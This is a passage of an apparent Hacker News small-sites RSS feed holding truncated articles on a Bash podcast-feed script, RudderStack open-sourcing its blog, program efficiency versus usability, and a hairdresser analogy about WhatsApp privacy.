<p>My hack-y brain suggests another copy-pasta. Let's take the feed generated by the Podsync library in the section above, replace pieces of it with Bash variables, and then loop through my text files to jam in the values I want.</p>
<p>More googling ensures, including learning a bit more about <a href="https://en.wikipedia.org/wiki/Here_document#:~:text=In%20computing%2C%20a%20here%20document,it%20were%20a%20separate%20file.">heredocs</a>, and I've eventually got this script:</p>
<div data-language="bash"><pre><code><span>#!/bin/bash</span>


<span>PODCAST_TITLE</span><span>=</span><span>"Castellan - Frankenstein"</span>
<span>PODCAST_AUTHOR</span><span>=</span><span>"Castellan"</span>
<span>CATEGORY</span><span>=</span><span>"Technology"</span>
<span>GENERATOR</span><span>=</span><span>"Castellan"</span>
<span>LINK</span><span>=</span><span>"https://whatrocks.github.io/castellan/"</span>
<span>IMG</span><span>=</span><span>"https://whatrocks.github.io/castellan/showart.jpg"</span>


<span>CURRENT_DATE</span><span>=</span><span><span>$(</span><span>date</span> -R<span>)</span></span>


<span>EPS</span><span>=</span><span>(</span>
  intro
  letter-1
  letter-2
  letter-3
  letter-4
  chapter-1
  chapter-2
  chapter-4
  chapter-3
  chapter-5
  chapter-6
  chapter-7
  chapter-8
  chapter-9
  chapter-10
  chapter-11
  chapter-12
  chapter-13
  chapter-14
  chapter-15
  chapter-16
  chapter-17
  chapter-18
  chapter-19
  chapter-20
  chapter-21
  chapter-22
  chapter-23
  chapter-24
  license
<span>)</span>

<span>read</span> -d <span>''</span> feed <span>&lt;&lt;</span> <span>EOF
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd"&gt;
  &lt;channel&gt;
    &lt;title&gt;<span>$PODCAST_TITLE</span>&lt;/title&gt;
    &lt;link&gt;<span>$LINK</span>&lt;/link&gt;
    &lt;description&gt;<span>$PODCAST_TITLE</span> (<span>$CURRENT_DATE</span>)&lt;/description&gt;
    &lt;category&gt;<span>$CATEGORY</span>&lt;/category&gt;
    &lt;generator&gt;<span>$GENERATOR</span>&lt;/generator&gt;
    &lt;language&gt;en-us&lt;/language&gt;
    &lt;lastBuildDate&gt;<span>$CURRENT_DATE</span>&lt;/lastBuildDate&gt;
    &lt;pubDate&gt;<span>$CURRENT_DATE</span>&lt;/pubDate&gt;
    &lt;itunes:author&gt;<span>$PODCAST_AUTHOR</span>&lt;/itunes:author&gt;
    &lt;itunes:subtitle&gt;<span>$PODCAST_TITLE</span>&lt;/itunes:subtitle&gt;
    &lt;itunes:summary&gt;&lt;![CDATA[<span>$PODCAST_TITLE</span> (<span>$CURRENT_DATE</span>)]]&gt;&lt;/itunes:summary&gt;
    &lt;itunes:image href="<span>$IMG</span>"/&gt;
    &lt;itunes:explicit&gt;no&lt;/itunes:explicit&gt;
    &lt;itunes:category text="<span>$CATEGORY</span>"&gt;&lt;/itunes:category&gt;
EOF</span>

<span>echo</span> <span>$feed</span>

<span>COUNT</span><span>=</span><span>1</span>
<span>for</span> <span>episode</span> <span>in</span> <span>${EPS<span>[</span>@<span>]</span>}</span><span>;</span>…</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.charlieharrington.com/flow-and-creative-computing">https://www.charlieharrington.com/flow-and-creative-computing</a></em></p>]]>
            </description>
            <link>https://www.charlieharrington.com/flow-and-creative-computing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792367</guid>
            <pubDate>Fri, 15 Jan 2021 16:04:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The Open Source Story – Open Sourcing RudderStack Blog and Docs]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25792282">thread link</a>) | @veenap
<br/>
January 15, 2021 | https://rudderstack.com/blog/the-open-source-story-open-sourcing-rudderstack-blog-and-docs | <a href="https://web.archive.org/web/*/https://rudderstack.com/blog/the-open-source-story-open-sourcing-rudderstack-blog-and-docs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><figure><div></div></figure><section><div itemprop="articleBody"><h2>It’s all About Open Source</h2>
<p>Open source is a component of almost all software development that takes place today. If you look back, the influence has been potent. For example, the main reason Python became the language most-suited for machine learning is the open-source contributors. In fact, because of the enormous size of the open-source community that is tirelessly developing Python, <a href="https://www.wired.com/2015/11/google-open-sources-its-artificial-intelligence-engine/">Google open-sourced TensorFlow</a>. </p>
<p>Joe Worrall, Director of Open Source and Developer Advocacy at New Relic, <a href="https://blog.newrelic.com/product-news/contributor-centric-systems/">describes</a> the dynamics behind the power of building contributor-centric systems: </p>
<p><em>“Contributors don’t give to the cause. They are a part of it.”</em></p>
<p>RudderStack is an open-source customer data pipeline tool for developers. Being open source is a tag we wear with pride, so much so that we recently partnered with GitHub for <a href="https://github.com/sponsors">GitHub Sponsors for Companies</a>. We value the developer community that works hard to build and support open source projects. In a recent <a href="https://rudderstack.com/blog/RudderStack-gitHub-sponsors-making-open-source-more-sustainable-for-developers">blog</a>, we explained why RudderStack directly compensates developers for their contributions to our project. This post discusses why and how we open-sourced our content and took the next step in our open source journey.</p>
<h2>Why we Open Sourced our Blog and Docs</h2>
<p>Said simply, bringing more voices to the table increases our content’s quality and value, both in thought leadership and our technical documentation. </p>
<p>We want developers to share their ideas, thoughts, and findings while working with RudderStack, customer data, and data in general. We want to learn about the data stacks you are building, problems you are solving, and solutions you are creating. Blogs, tutorials, and even case studies are great ways to share that knowledge.  In short, we want you to contribute!</p>
<h2>Our Previous Blog Infrastructure</h2>
<p>We used <a href="https://wordpress.org/">WordPress</a> for our blog before we decided to open source it. WordPress itself is open source and is fantastic for its simplicity, SEO settings, advertising, and flexible themes. In fact, WordPress is the <em>numero uno</em> choice of bloggers for hosting their own websites as per <a href="https://www.techradar.com/in/best/cms">Tech Radar</a>. </p>
<p>From a site performance and version-control standpoint, though, it’s less straightforward than more modern tooling. Also, to allow contribution, you have to use some sort of plugin (like <a href="https://wordpress.org/plugins/user-submitted-posts/">User Submitted Posts</a>), a less-than-ideal experience for developers, and opens up your dashboard to outside users. </p>
<p>All-in-all, building an open-source, version-controlled blog that enables developers to create content and submit it via pull requests easily is a cumbersome and tricky process on WordPress.</p>
<h2>Open Source Frameworks Options for our Blog</h2>
<p>When we decided to open-source our blog and docs, we were spoilt for choices. Today there are multiple well-supported and fully-featured frameworks for open-source content creation. Some of the options that we considered were  <a href="https://ghost.org/features/">Ghost</a>, <a href="https://jekyllrb.com/">Jekyll</a>, <a href="https://gohugo.io/">Hugo</a>, <a href="https://nanoc.ws/">Nanoc</a>, and <a href="https://www.gatsbyjs.com/">Gatsby</a>. There are even more frameworks beyond these,  and each tool has its pros and cons. Which one do we recommend? Well, we don’t. The best tool for you is the one that fulfills your requirements.</p>
<h2>Why we Picked Gatsby</h2>
<p>We picked <a href="https://www.gatsbyjs.com/docs">Gatsby.js</a> as the framework for open-sourcing our content. While making the decision, Jekyll was a strong contender, but the final choice for us was Gatsby. </p>
<p>Here’s why we chose it:</p>
<ul>
<li>Writing content in Gatsby is simple and developer-friendly. It uses Markdown for formatting. It just takes two plugins to set it up (<code>gatsby-source-filesystem</code> and <code>gatsby-transformer-remark</code>). </li>
<li>Integration with GitHub Pages is simple, which was a priority for us.</li>
<li>Gatsby has a rich library of plugins, which you can use for extending and introducing additional functionalities (in fact, through GitHub Sponsors, we had a <a href="https://www.gatsbyjs.com/plugins/gatsby-plugin-rudderstack/">RudderStack plugin</a> made!)</li>
<li>Implementing Gatsby is relatively straightforward in most cases. You can check their <a href="https://www.gatsbyjs.com/docs/quick-start/">docs</a> to see how to get started with Gatsby.js.</li>
<li>Gatsby is super high performance, meaning speedy page load times.</li>
<li>Gatsby allows creating an interactive experience for the readers.</li>
<li>A vast modern web development community contributes to it.</li>
</ul>
<h2>Wait, What About the Docs?</h2>
<p>Our docs still run on Gitbook but are now open-sourced so that others can contribute. We are currently exploring other open-source frameworks like Slate that will give us more flexibility and better telemetry. We will write another post when we make a decision and complete the migration. </p>
<h2>We are Open Source now!</h2>
<p>So, the RudderStack Blog and Docs are now open source. We’re excited about contributions from the RudderStack community and beyond. </p>
<p>In fact, developers have already started contributing to our documentation. Recently, <a href="https://github.com/benedikt">Benedikt</a> from the <a href="https://userlist.com/">Userlist</a> team created the <a href="https://docs.rudderstack.com/destinations/userlist">docs for the Userlist destination</a> for RudderStack (see the pull request <a href="https://github.com/rudderlabs/rudderstack-docs/pull/12">here</a>). They also built the Userlist integration, submitted a pull request, and it is now live on our platform!  This is the beauty of open source!</p>
<h2>How to Contribute</h2>
<p>Contributing to RudderStack is simple!</p>
<ul>
<li>Visit <a href="https://github.com/rudderlabs/rudder-blog/tree/main/content/blog">RudderStack Blog</a> to contribute to blogs or <a href="https://github.com/rudderlabs/rudderstack-docs">RudderStack Docs</a> for docs..</li>
<li>If you wish to add a new blog/doc, click on <strong>Create new file</strong> or <strong>Upload files</strong> as shown in the following diagram.</li>
<li>Also, to suggest changes to an existing file, go to the file and select Edit this file.</li>
<li>Once you make the changes, Click on <strong>Propose changes</strong>.</li>
</ul>
<figure><span>
      <a href="https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/541fe/opensourcingbloganddocs.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="opensourcingbloganddocs" title="opensourcingbloganddocs" src="https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/f058b/opensourcingbloganddocs.png" srcset="https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/c26ae/opensourcingbloganddocs.png 158w,
https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/6bdcf/opensourcingbloganddocs.png 315w,
https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/f058b/opensourcingbloganddocs.png 630w,
https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/40601/opensourcingbloganddocs.png 945w,
https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/78612/opensourcingbloganddocs.png 1260w,
https://rudderstack.com/blog/static/30dddca83435bf1eed57d34a82caaf0f/541fe/opensourcingbloganddocs.png 1654w" sizes="(max-width: 630px) 100vw, 630px" loading="lazy">
  </a>
    </span><figcaption>How to contribute to RudderStack blog and Docs</figcaption></figure>
<ul>
<li>Once your Pull Request is created, we will review the changes you’ve made.</li>
<li>If everything looks okay, our team will accept it (or edit to make it reader friendly), and <a href="https://www.merriam-webster.com/dictionary/voil%C3%A0">Voilà</a>! Your changes will reflect on the pages.</li>
</ul>
<p>Start building a better, warehouse-first CDP that delivers complete, unified data to every part of your marketing and analytics stack by signing up for <a href="https://app.rudderlabs.com/signup?type=freetrial">RudderStack Cloud Free</a> today. <a href="https://rudderstack.com/blog/">Subscribe to our blogs</a>, join <a href="https://resources.rudderstack.com/join-rudderstack-slack">Slack</a> to chat with our team, check out our open-source repos on <a href="https://github.com/rudderlabs">GitHub</a>, and follow us on our socials: <a href="https://twitter.com/RudderStack">Twitter</a>, <a href="https://www.linkedin.com/company/rudderlabs/">LinkedIn</a>, <a href="http://dev.to/">dev.to</a>, <a href="https://rudderstack.medium.com/">Medium</a>, <a href="https://www.youtube.com/channel/UCgV-B77bV_-LOmKYHw8jvBw">YouTube</a>. Don’t miss out on any updates. <a href="https://rudderstack.com/blog/">Subscribe</a> to our blogs today!</p></div></section></article></div>]]>
            </description>
            <link>https://rudderstack.com/blog/the-open-source-story-open-sourcing-rudderstack-blog-and-docs</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792282</guid>
            <pubDate>Fri, 15 Jan 2021 15:57:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Small and Efficient (2020)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25791723">thread link</a>) | @q-big
<br/>
January 15, 2021 | https://datagubbe.se/small_efficient/ | <a href="https://web.archive.org/web/*/https://datagubbe.se/small_efficient/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p><i>Spring 2020</i></p>

<p>
Shortly before the end of 2019 I stumbled across an excerpt from "Modern Operating Systems" by Andrew S. Tanenbaum, a well-known Computer Science professor and the original author of the MINIX operating system.
</p>

<p>
In it, he writes that <i>"[MULTICS] was designed to support hundreds of users on a machine only slightly more powerful than an Intel 386 (...) This is not quite as crazy as it sounds, since in those days people knew how to write small, efficient programs, a skill that has subsequently been completely lost."</i>
</p>

<p>
The quote has rattled around in my head since then. It's somewhat tongue-in-cheek, but the sentiment is clear. It wasn't the first time I'd heard something like it, and Tanenbaum isn't the first nor the last to make such a claim - I myself am surely guilty of saying something similar at some point in time. Nevertheless, it stuck with me because it's both factually incorrect and very insulting to a lot of young programmers.
</p>

<p>
In Tanenbaum's defense, I understand where he's coming from. It's an easy mistake to make, common among us grumpy old gits. Looking at modern software munching memory and disk space by the gigabyte, it's easy to reminisce about simpler times when 640 or even 64 kilobytes of RAM were enough for everyone.
</p>

<p>
It's also a very common misconception. The sentiment is just as applicable to trades other than programming and likely crops up everywhere with some regularity. Any craft that has developed over time, be it software development, cooking, tailoring, fishing or masonry, will have a group of elders scoffing at new-fangled shortcuts and technological advancements. Such modern folly is made out to be something that sullies the inherent soul of the workmanship and lessens its value. The fact that new skills might have to be learned to master this new technology is seldom taken into account when making such statements.
</p>

<p>
I'm certainly not advocating progress simply for the sake of progress. Doing so often leads to confusing the two very different concepts of <i>change</i> and <i>improvement</i>, a distinction sadly apparent to some only after it has been demonstrated empirically. It's also always good with a bit of historical knowledge, if nothing else because it's humbling to learn about the giants upon whose shoulders we stand.
</p>

<p>
The desire for faster computers with more memory, however, is a desire for real improvement. It means that not only can we do more of the same with our machines, but also new things that seemed impossible mere decades ago. This is important, because herein lies the core of my reasoning.
</p>

<h3>Elder Usability</h3>

<p>
Today, computers are ubiquitous. Not just as laptops or desktops in homes and offices, but as tablets, smartphones, wristwatches and entertainment centers. In fact, pretty much anything except food can be bought in some computerized form today: vacuum cleaners, light bulbs, mirrors, books, cars - even doorbells. We are at a point where we can have computers do our bidding by speaking to them in everyday phrases and be reasonably well understood.
</p>

<p>
At the time when MULTICS was conceptually conceived, a computer was, with few exceptions, a great big machine that easily filled a large room. One that had the performance of a 386 chip was truly top of the line, cutting edge stuff. In fact it was so advanced and expensive that MULTICS itself was accused of being a resource hog, which was one of the reasons it never became very popular.
</p>

<p>
The methods used to get an ancient mainframe like that to perform computations were, put simply, extremely crude. Complex program code had to be written in clunky languages like FORTRAN, stored on massive amounts of punched paper cards and mechanically read into the computer's small and expensive memory. If one was lucky and the program ran without bugs, all you could do was to wait. Even relatively simple tasks that a layperson has been able to solve in the blink of an eye using a spreadsheet program for the last few decades, could take minutes or even hours to carry out - after the computer had been prepped and the program loaded, of course.
</p>

<p>
That doesn't mean the layperson with the spreadsheet program is a skilled programmer, but it also doesn't mean there are no skilled programmers today. It's simply an example of where increased program complexity also increases the usefulness and usability of a computer. For a layperson to perform such a task without the knowledge of FORTRAN and card punches, such complexity is necessary. This, in turn, increases the overall footprint of software.
</p>

<p>
MULTICS and (perhaps to a greater extent) its more successful spin-off, UNIX, were certainly wonders of software engineering. They did truly provide multi-user, multi-tasking environments for a number of generic applications to run in and they did so on very limited hardware. At the same time, there was nothing about those systems that someone could get to grips with after goofing around with a mouse and GUI for a few hours. Everything was based on cryptic commands you had to learn by heart, controlled with even more cryptic parameters you also had to learn by heart.
</p>

<p>
Once learned, those commands could then be used to start a program. Not that you'd really know if it was even running, because most of the programs made no significant difference on the computer's output. Often they just produced a blank screen or an empty line on an teletype and were as cryptic to operate as the commands for starting them. Even a program for performing simple arithmetic could be confusing to a first time user, who would surely want to write "1 + 2" and press enter for a result, but may have had to learn about stacks and RPN and input "1 2 + p" to carry out a basic integer addition.
</p>

<p>
RPN, Reverse Polish Notation, was a great invention because it reduced memory usage at a time when memory was stupendously expensive - exactly the kind of "small and efficient" code Tanenbaum claims is a lost art. It is also an excellent example of why less small and less efficient programming might produce a more pleasant experience for the end user, who can then focus more on the actual problem at hand than on how to think like the computer used to solve it. Today we expect that even the cheapest of phones come with a program resembling a pocket calculator for performing such calculations, requiring little more prerequisite knowledge than a few grade school math lessons.
</p>

<h3>Pointing and Clicking</h3>

<p>
At the time of MULTICS, using computers meant dealing with crude and complex user interfaces, long execution times and results most often presented with simple text printed on paper. The code was small and efficient because the machines offered programmers no other choice, but that code - as brilliant as it was - resulted in a primitive, time consuming and often frustrating user experience. This was what users expected, even if it meant learning RPN for calculations and at least one complex, declarative programming syntax to format even the simplest of documents.
</p>

<p>
Today, we use graphical interfaces for most things. There are still people, like me, who enjoy the power and flexibility offered by a command line once you've learned how to operate it. For others, such as beginner users or the vast majority of people who simply consider their computer to be any other home appliance, the GUI is much more efficient. There's no need to think like a CPU, to memorize cumbersome commands and keep intricate data structures such as directory trees and concepts like logical operators in your head.
</p>

<p>
The GUI comes as at a cost: These easy to use interfaces add complexity to program code, requiring more memory and faster processors. Even early graphical interfaces required considerable power and, though instantly recognizable by a modern-day user, they lacked both speed, finesse and luxuries such as color. It has been a long, meandering journey to end up where we are today.
</p>

<h3>To type a €uro sign</h3>

<p>
Take something as ostensibly simple as text rendering. It was a big step up in usability when computers moved from DIP switch panels and blinkenlights to interfacing over teletypes: plain text commands could be entered and yielded plain text results. It was all 7-bit ASCII (or an equivalent) of course, not taking up much space and not requiring a lot of computational resources. The teletype dictated what characters most of the software written should be able to handle, keeping things small and efficient.
</p>

<p>
Moving forward a bit, teletypes were replaced by CRT terminals. In the beginning, they merely emulated their mechanical predecessors but software that utilized the fixed width and height of a screen and their faster refresh rate soon materialized. Full screen editors, for example, were a step up for the end users, giving them contextual information about the line they were currently editing by displaying the surrounding lines on screen at all times.
</p>

<p>
Of course, manufacturers wanted to sell their computers and terminals to markets other than English speaking ones, which made 7-bit character space a bit crowded. Adding an extra bit of information doubled the number of characters and, in effect, opened up the central European market in earnest. Things like umlauts, circumflexes and accents are taken for granted today but to handle them, we had to increase memory and bandwidth usage.
</p>

<p>
Asian languages such as Mandarin and Japanese, using complex signs for whole words, and a whole host of other alphabets such as Farsi and Tagalog, eventually led to the creation of Unicode and UTF, in which a single character now may take up many times the space of one in 7-bit ASCII. This adds a lot of complexity in tools written for handling simple text files. It also adds a lot of complexity in displaying such text. At the time when 7-bit ASCII ruled, a terminal had a fixed font embedded in hardware and there were no other choices. If you were lucky, it could display bold text in some fashion, but …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://datagubbe.se/small_efficient/">https://datagubbe.se/small_efficient/</a></em></p>]]>
            </description>
            <link>https://datagubbe.se/small_efficient/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791723</guid>
            <pubDate>Fri, 15 Jan 2021 15:03:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Hairdresser Analogy]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25791684">thread link</a>) | @jessems
<br/>
January 15, 2021 | https://jessems.com/hairdresser-analogy | <a href="https://web.archive.org/web/*/https://jessems.com/hairdresser-analogy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p><span>
      <a href="https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/fcdb9/hairdresser-analogy.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Rummaging Hairdresser" title="The Rummaging Hairdresser" src="https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/af659/hairdresser-analogy.jpg" srcset="https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/8356d/hairdresser-analogy.jpg 259w,https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/bc760/hairdresser-analogy.jpg 518w,https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/af659/hairdresser-analogy.jpg 1035w,https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/51eb8/hairdresser-analogy.jpg 1553w,https://jessems.com/static/658a8410edd4aad7a4bf8168ee804c47/fcdb9/hairdresser-analogy.jpg 1737w" sizes="(max-width: 1035px) 100vw, 1035px" loading="lazy">
  </a>
    </span></p><p><em>This is a thought exercise to help explore what is okay (and what isn't) when it comes to the exchange between personal information and the provision of a personalised service.</em></p><p>Imagine you've moved to a new city and you're in need of a hairdresser to do your hair every other week. Perhaps you try out one or two different ones first, or perhaps you go with a friend's recommendation. Either way, after a short while you've settled on a hair dresser you're happy with. They're professional, they treat you well, they remember your name and you build up a relationship with them over time.</p><p>As you visit this hairdresser more often, they gain more experience with your specific hair type, your preferred hair style and your preferred hair products. Perhaps the hairdresser, knowing that you have particularly thick hair, and remembering that you dislike the way it curls around your ears when it gets too long, ensures a shorter cut in those areas by default. Or, perhaps remembering that you’re most happy when your hair has a bouncy look to it, they introduce you to a specific type of wax that helps you achieve that type of effect.</p><p>There's a direct relationship here between (1) how much the hairdresser knows about you, and remembers about you, and (2) the quality of the service you receive. The more the hairdresser knows about you, the better the service they can provide. It's convenient to you when you don't have to explain what you want every time you visit. It's valuable to you when your hairdresser knows so much about your hair and your preferences that they're able to suggest things to you you didn't even know you wanted. It can also be nice if they remember the names of your children, or if they ask about that issue you were grappling with at work the last time you stopped by.</p><p>Now imagine it’s time for your regular haircut, so you visit your trusted hairdresser. You sit down in the salon chair, as you've been doing every other week and they tell you they'll be "right with you." As you look into the mirror in front of you, you see them in the reflection walking up to the coat hanger where you've hung up your coat. Having arrived at your coat they start to insert their hand into your coat's pockets one by one. For each pocket they extract its contents (your wallet, your mobile phone, your keys <sup id="fnref-1"><a href="#fn-1">1</a></sup>) and examine each carefully, before placing them back. After having made their way through your entire coat, they return to your chair to finally tend to your needs: "So, what will it be today? The usual?"</p><p>In this real-life scenario most people would, at the very least, be astonished but hopefully also a bit angry. You might want to say: "Hey! What are you doing in my coat?" Now imagine their response being "Oh, that's just a new policy we've introduced which helps us improve our service to you. You see," they continue, "as I was examining the items in your coat, I noticed a car key with an Audi logo. One of my friends happens to be an Audi mechanic. I can put you in touch with him, if you're interested, and they can help you if your car ever breaks down. I also made note of the contacts in your phone, and if one of them ever comes in for a haircut, and I'll be sure to give them a special treatment, on the house." <sup id="fnref-2"><a href="#fn-2">2</a></sup></p><p>Would this explanation suffice for you? Would it be sufficient justification for rummaging <sup id="fnref-3"><a href="#fn-3">3</a></sup> through your coat? Would it quench the anger you felt above?</p><p>I would hope that to most people this justification sounds silly, perhaps even patronizing and certainly not an adequate justification for rummaging through your belongings. Whether or not the hairdresser's rummaging improves his service to you doesn't matter.</p><p>The only thing that matters here is that your hairdresser has no business rummaging through your fucking coat <sup id="fnref-4"><a href="#fn-4">4</a></sup>.</p><p>Please remember how this makes you feel. We're going to change some variables in the story and see what happens.</p><p>Let's go back to our imagined scenario. You feel offended that your hairdresser went through your coat and you say: "Hey man, I didn't agree to that!"</p><p>"Oh, I'm sorry" he replies "I didn't mean to offend you. But actually, you did consent to this new policy. You see, there's a sign at the door which says:</p><p><em>‘Anybody that walks through this door consents to their coat being rummaged through for purposes of improving our service to you.'</em></p><p>So by walking through the door, you've actually given your consent." <sup id="fnref-5"><a href="#fn-5">5</a></sup>.</p><p>Let’s ignore, for the sake of brevity, the issue of whether walking through a door could reasonably constitute giving consent. Imagine instead that you don't catch the hairdresser rummaging through your coat, but instead they tell you their assistant will examine all your belongings while you lie back, close your eyes and have your hair washed by them with lavender shampoo.</p><p>Try to notice within yourself: Do you feel less outrage if you're not witnessing the act of someone rummaging through your coat, but you know it's happening? For me it makes it slightly more difficult to "find" the outrage inside of myself. Since I’m not witnessing the act with my own eyes, I need to first imagine it happening before I'm able to perceive any level of outrage. The outrage is still there, but it's become a bit harder to access. It's become a bit more distant if you will.</p><p>Let's continue to change variables. Let's imagine there's no assistant but the hairdresser has installed a high tech camera in the room which, without touching your coat and within a microsecond, is able to scan your coat and analyze all its contents. In doing so, it is able to extract the same information the hairdresser and their assistant were able to do when they were doing it themselves. Imagine this takes place in a split second and it happened as you sat down.</p><p>Do you feel angry about what just happened? Do you feel less outrage than before now that the violation is invisible to you, instantaneous and done through an inanimate object?</p><p>For me, I feel outrage, but it's become less visceral and more intellectual. It's as if I only feel outrage because I’m able to follow a sequence of logical steps to arrive at the conclusion that the outcomes of the camera scan and the physical rummaging are one and the same. That said, without the image of a person with their hands in my coat (imagined or not), it’s more difficult to feel outraged. It’s also harder to feel outraged when the violation is committed by an inanimate object. For one, I'm not sure who to get angry at, and I somehow feel less violated when it's a machine or an algorithm committing the act.</p><p>Now go one step further and imagine it's not even a high-tech camera doing the scanning, but some unknown technology which you cannot see and do not understand. It’s not located anywhere you can point at, it’s just “there” somewhere in the hairdresser’s salon with you as it scans the contents of your jacket.</p><p>Are you able to find any outrage at all this time? </p><p>I can still find it, but it’s even more difficult to find than before. With the camera at least I had something I could focus my anger on (and could potentially smash). Without any identifiable person or object committing these acts, the act itself seems to slowly lose the property of being something one could potentially object to.</p><p>My outrage seems to require at a minimum a crime and a perpetrator. I struggle to find those here. Only by invoking the analog equivalent from before and by imagining an actual person committing these acts do I feel outrage. But equating this last scenario to the analog equivalent feels slightly awkward; an oversimplification. As a result, the outrage doesn’t transfer fully from one scenario to the other.</p><p>By changing the process through which the information was extracted while keeping the outcome (the extracted data) the same, my outrage circuitry has almost entirely been bypassed. This was achieved by making the scenario more abstract, instantaneous, invisible and by making the actor an inanimate, unidentifiable piece of technology.</p><p>Now, one final step. Imagine we hadn't started with the analog example of the rummaging hairdresser and the emotional memory of how that made you feel. Imagine instead we would have started with the invisible, instantaneous, inanimate technology. Would you have been able to feel any outrage? Any whatsoever? Would you naturally think of coming up with an analog equivalent scenario to gauge your outrage?</p><p>You actually don't need to imagine the last example. If you're currently using WhatsApp, you're living inside of it. The hairdresser represents Facebook and the coat rummaging policy represents their new privacy policy, or Facebook's general conduct for that matter. If you don't feel outrage, then perhaps that's because you haven't imagined the analog equivalent of what's happening yet (which isn't always self-evident, that’s what I’ve tried to help you with here) <sup id="fnref-6"><a href="#fn-6">6</a></sup>.</p><p>The key observation to note here is that the outrage that gets triggered inside of you gets modulated by <em>the manner in which</em> your information gets extracted, not so much <em>if</em> it gets extracted. It's as if robbing someone of $100 would somehow be less outrageous if you did it through the internet rather than snatching it directly from their wallet.</p><p>In a high-tech society, where we’re surrounded by technological abstractions upon abstractions, should we only be relying on our instinctual outrage circuits to be our moral compasses when they can so easily be fooled?</p><p><em>Even though the hairdresser in this story (Facebook / WhatsApp) is rummaging through your coat, there are many reputable hairdressers (messaging services) that do not. My favourite alternative is <a href="https://signal.org/">Signal</a> <sup id="fnref-7"><a href="#fn-7">7</a></sup>, but I've heard good things about <a href="https://threema.ch/">Threema</a> and although I don't get the impression the technology is accessible enough to port my friends and family, I'm supportive of what <a href="https://matrix.org/">Matrix</a> is trying to accomplish.</em></p></div></article></div>]]>
            </description>
            <link>https://jessems.com/hairdresser-analogy</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791684</guid>
            <pubDate>Fri, 15 Jan 2021 15:00:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Hacker News Top (Alexa Skill)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25791569">thread link</a>) | @feyjal
<br/>
January 15, 2021 | https://www.amazon.ca/dp/B08T61KL3X/ref=sr_1_3?dchild=1&keywords=hacker+news&qid=1610722155&s=digital-skills&sr=1-3 | <a href="https://web.archive.org/web/*/https://www.amazon.ca/dp/B08T61KL3X/ref=sr_1_3?dchild=1&keywords=hacker+news&qid=1610722155&s=digital-skills&sr=1-3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    <div>

        

        <div>
            <div>
                <h4>Enter the characters you see below</h4>
                <p>Sorry, we just need to make sure you're not a robot. For best results, please make sure your browser is accepting cookies.</p>
                </div>
            </div>

            <div>

                <div>
                    <div>

                        <form method="get" action="/errors/validateCaptcha" name="">
                            
                            <div>
                                <div>
                                    <div>
                                        <h4>Type the characters you see in this image:</h4>
                                        <p><img src="https://images-na.ssl-images-amazon.com/captcha/derqnxxq/Captcha_slyqqqdxho.jpg">
                                        </p>
                                        <div>
                                            <div>
                                                
                                                <div>
                                                    <p><a onclick="window.location.reload()">Try different image</a>
                                                </p></div>
                                            </div>
                                            </div>
                                    </div>
                                </div>
                            </div>

                            <div>

                                

                            </div>
                        </form>

                    </div>
                </div>

            </div>

        </div>

        <div></div>

        <div>
            <p><a href="https://www.amazon.ca/gp/help/customer/display.html/ref=footer_cou?ie=UTF8&amp;nodeId=1040616">Conditions of Use &amp; Sale</a>
            <span></span>
            <span></span>
            <span></span>
            <span></span>
            <a href="https://www.amazon.ca/gp/help/customer/display.html/ref=footer_privacy?ie=UTF8&amp;nodeId=502584">Privacy Notice</a>
        </p></div>

        <p>
          © 1996-2015, Amazon.com, Inc. or its affiliates
          
          
        </p>
    </div></div>]]>
            </description>
            <link>https://www.amazon.ca/dp/B08T61KL3X/ref=sr_1_3?dchild=1&amp;keywords=hacker+news&amp;qid=1610722155&amp;s=digital-skills&amp;sr=1-3</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791569</guid>
            <pubDate>Fri, 15 Jan 2021 14:50:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Secure Signed JWT]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25791280">thread link</a>) | @mooreds
<br/>
